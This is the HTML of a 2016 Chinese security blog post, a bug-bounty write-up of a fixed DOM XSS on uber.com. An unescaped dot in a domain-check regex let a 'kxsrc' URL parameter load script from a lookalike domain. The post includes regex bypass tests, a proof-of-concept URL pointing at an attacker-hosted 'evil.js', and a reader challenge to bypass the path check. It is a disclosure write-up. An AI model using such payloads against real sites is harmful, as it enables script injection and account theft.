@@ -1,0 +1,698 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next muse">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="BBP,XSS,安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="zhchbin" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="前言两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。
+漏洞代码在看Uber的网站前端JS代码的时候，发现有如下的一段代码：
+123456789101112131415">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[BBP系列一] 人生第一个值钱的XSS漏洞">
+<meta property="og:url" content="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/index.html">
+<meta property="og:site_name" content="zhchbin">
+<meta property="og:description" content="前言两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。
+漏洞代码在看Uber的网站前端JS代码的时候，发现有如下的一段代码：
+123456789101112131415">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/7184df6bgw1f7otlqoccoj211i03xjsu.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[BBP系列一] 人生第一个值钱的XSS漏洞">
+<meta name="twitter:description" content="前言两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。
+漏洞代码在看Uber的网站前端JS代码的时候，发现有如下的一段代码：
+123456789101112131415">
+
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/"/>
+
+  <title> [BBP系列一] 人生第一个值钱的XSS漏洞 | zhchbin </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?7c9353bfaa5510a38b4349ec413d2d18";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">zhchbin</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                [BBP系列一] 人生第一个值钱的XSS漏洞
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-09-10T20:40:17+08:00" content="2016-09-10">
+              2016-09-10
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/09/10/A-Valuable-XSS/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/10/A-Valuable-XSS/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>两个月前的一天，在Hackerone上看了不少报告之后的我跃跃欲试，不自量力地给自己定下一个目标：一定要找一个能够获得Bounty的漏洞！然后，前后差不多花了三天的时候，找到了Uber网站的一个XSS漏洞。今早也顺利地收获了人生的第一笔奖金，$7000。接下来就分享一下这个漏洞吧。</p>
+<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>在看Uber的网站前端JS代码的时候，发现有如下的一段代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> k = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);  <span class="comment">// 创建script标签</span></span><br><span class="line">    k.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    k.async = <span class="literal">true</span>;</span><br><span class="line">    k.setAttribute(<span class="string">"data-id"</span>, u.pubid);</span><br><span class="line">    k.className = <span class="string">"kxct"</span>;</span><br><span class="line">    k.setAttribute(<span class="string">"data-version"</span>, <span class="string">"1.9"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从location.href参数中读取kxsrc</span></span><br><span class="line">    <span class="keyword">var</span> m, src = (m = location.href.match(<span class="regexp">/\bkxsrc=([^&amp;]+)/</span>)) &amp;&amp; <span class="built_in">decodeURIComponent</span>(m[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查kxsrc参数的值是否满足正则，如果满足则加载，否则加载默认的JS文件 </span></span><br><span class="line">    k.src = <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(src) ? src : src === <span class="string">"disable"</span> ? <span class="string">""</span> : (location.protocol === <span class="string">"https:"</span> ? <span class="string">"https:"</span> : <span class="string">"http:"</span>) + <span class="string">"//cdn.krxd.net/controltag?confid="</span> + u.pubid;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'script'</span>)[<span class="number">0</span>];</span><br><span class="line">    s.parentNode.insertBefore(k, s);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>目前代码还能在：<a href="https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js" target="_blank" rel="external">https://tags.tiqcdn.com/utag/uber/main/prod/utag.273.js</a> 看到，不过修复之后相应的网站已经不会加载这个代码文件了。 通过阅读上面这段代码，我们能够知道参数是<code>kxsrc</code>是可以被用户控制的，而且如果满足一定条件，该参数所指定的js文件就会被加载。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>咋一看，这段代码似乎没有什么问题：JS文件只能是<code>krxd.net</code>域下的文件。然而，在正则表达式里：<code>.</code>代表的意思是匹配任意字符。我们来做一个简单的实验，F12打开浏览器的调试窗口：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.bkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.ckrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.dkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.ekrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://a.fkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://aafkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line">&gt;  <span class="regexp">/^https?:\/\/([a-z0-9-.]+.)?krxd.net(:\d&#123;1,5&#125;)?\/controltag\//i</span>.test(<span class="string">'https://abfkrxd.net/controltag/evil.js'</span>)</span><br><span class="line">&lt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1f7otlqoccoj211i03xjsu.jpg" alt=""></p>
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>买个域名！部署一下HTTPS！写一个简单的JS文件！添加到参数里！Bingo，就是这么神奇！<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//www</span>.uber.com/?<span class="keyword">exp</span>=hp-c&amp;kxsrc=https<span class="variable">%3A</span><span class="variable">%2F</span><span class="variable">%2Fwww</span>.akrxd.net<span class="variable">%2Fcontroltag</span><span class="variable">%2Fevil</span>.js</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1f7otuv4e5hg20sb0k6x6p.gif" alt=""></p>
+<p>思考题: 写这段正则判断代码的人应该还希望限制路径，但其实很容易就可以被绕过，怎么绕呢？</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/BBP/" rel="tag">#BBP</a>
+          
+            <a href="/tags/XSS/" rel="tag">#XSS</a>
+          
+            <a href="/tags/安全/" rel="tag">#安全</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/09/01/Baidu-Browser-RCE/" rel="next" title="[浏览器安全系列二] 百度浏览器远程命令执行">
+                <i class="fa fa-chevron-left"></i> [浏览器安全系列二] 百度浏览器远程命令执行
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/10/06/Sogou-Browser-RCE/" rel="prev" title="搜狗浏览器从UXSS到远程命令执行">
+                搜狗浏览器从UXSS到远程命令执行 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/09/10/A-Valuable-XSS/"
+           data-title="[BBP系列一] 人生第一个值钱的XSS漏洞" data-url="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpeg"
+               alt="Chaobin Zhang" />
+          <p class="site-author-name" itemprop="name">Chaobin Zhang</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">16</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/zhchbin" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/zhchbin" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://wooyun.org/whitehats/zhchbin" target="_blank" title="Wooyun">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Wooyun
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞代码"><span class="nav-number">2.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PoC"><span class="nav-number">4.</span> <span class="nav-text">PoC</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Chaobin Zhang</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"zhchbingithubblog"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
